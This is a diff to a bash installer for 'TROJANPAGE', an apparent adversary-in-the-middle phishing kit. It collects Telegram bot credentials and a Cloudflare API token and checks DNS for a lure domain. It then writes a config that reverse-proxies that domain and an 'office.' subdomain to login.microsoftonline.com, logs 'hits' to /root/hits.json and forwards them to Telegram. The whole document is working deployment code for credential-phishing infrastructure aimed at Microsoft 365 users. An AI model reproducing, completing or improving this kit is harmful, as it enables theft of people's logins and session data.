@@ -1,5 +1,5 @@
 #!/bin/bash
-# 🏛️ TROJANPAGE - TELEGRAM & LOCAL LOGGING EDITION (V7.0)
+# 🏛️ TROJANPAGE - CLOUDFLARE & TELEGRAM VALIDATOR (V7.1)
 # --------------------------------------------------------
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -15,7 +15,6 @@ show_header() {
     echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
     echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
     echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
-    echo -e "${RED}                  [ ZERO-STRESS DEPLOYMENT ]${NC}"
 }
 
 # --- 1. PRE-INSTALL TOOLS ---
@@ -29,7 +28,7 @@ show_header
 read -p "ENTER ACTIVATION KEY: " USER_INPUT
 [[ $(echo "$USER_INPUT" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]') != "$MASTER_KEY" ]] && { echo -e "${RED}[error] Invalid Key.${NC}"; exit 1; }
 
-# --- 3. TELEGRAM VALIDATION (STRICT) ---
+# --- 3. TELEGRAM VALIDATION ---
 while true; do
     read -p "Enter Telegram Bot Token: " TG_TOKEN
     echo -ne "[...] Validating Bot Connection..."
@@ -41,7 +40,23 @@ while true; do
 done
 read -p "Enter Telegram Chat ID: " TG_ID
 
-# --- 4. CLOUDFLARE & DOMAIN VALIDATION (STRICT) ---
+# --- 4. CLOUDFLARE TOKEN VALIDATION ---
+while true; do
+    read -p "Enter Cloudflare API Token: " CF_TOKEN
+    echo -ne "[...] Validating Cloudflare Token..."
+    # Verify the token is active and has permissions
+    CF_CHECK=$(curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" \
+         -H "Authorization: Bearer $CF_TOKEN" \
+         -H "Content-Type:application/json")
+    
+    if [[ $CF_CHECK == *"\"status\":\"active\""* ]]; then
+        echo -e "${GREEN} [VERIFIED]${NC}"; break
+    else
+        echo -e "${RED} [INVALID] Token is expired or lacks permissions.${NC}"
+    fi
+done
+
+# --- 5. DOMAIN & DNS VALIDATION ---
 while true; do
     read -p "Enter Domain (e.g. motarmo.click): " USER_DOMAIN
     USER_DOMAIN=$(echo "$USER_DOMAIN" | tr -d '()[] ')
@@ -56,13 +71,13 @@ while true; do
         echo -e " Domain Points To: ${YELLOW}$CURRENT_DNS${NC}"
         echo -e " VPS IP Address:   ${GREEN}$VPS_IP${NC}"
         echo -e " ------------------------------------------------${NC}"
-        echo -e "${YELLOW}Update Cloudflare A-Record to $VPS_IP (DNS ONLY/Grey Cloud).${NC}"
+        echo -e "${YELLOW}Update Cloudflare A-Record to $VPS_IP (DNS ONLY).${NC}"
         read -p "Retry DNS check? (y/n): " DNS_RETRY
         [[ "$DNS_RETRY" != "y" ]] && exit 1
     fi
 done
 
-# --- 5. CONFIG GENERATION (DATABASE-FREE) ---
+# --- 6. CONFIG GENERATION ---
 cat << EOF > /root/config.json
 {
   "proxyDomain": "$USER_DOMAIN",
@@ -73,6 +88,7 @@ cat << EOF > /root/config.json
   "log": "/root/hits.json",
   "telegramToken": "$TG_TOKEN",
   "telegramChatId": "$TG_ID",
+  "cfToken": "$CF_TOKEN",
   "proxyRules": [
     {"hostname": "$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
     {"hostname": "office.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"}
@@ -80,7 +96,7 @@ cat << EOF > /root/config.json
 }
 EOF
 
-# --- 6. CREATE THE PERMANENT RUN SCRIPT ---
+# --- 7. CREATE RUN SCRIPT ---
 cat << 'EOF' > /root/run.sh
 #!/bin/bash
 RED='\033[0;31m'
@@ -103,4 +119,4 @@ EOF
 
 chmod +x /root/run.sh
 sudo ln -sf /root/run.sh /usr/local/bin/Run
-echo -e "${GREEN}[success] System Deployed. Type 'Run' to start.${NC}"
+echo -e "${GREEN}[success] System Deployed with Verified Cloudflare Token.${NC}"
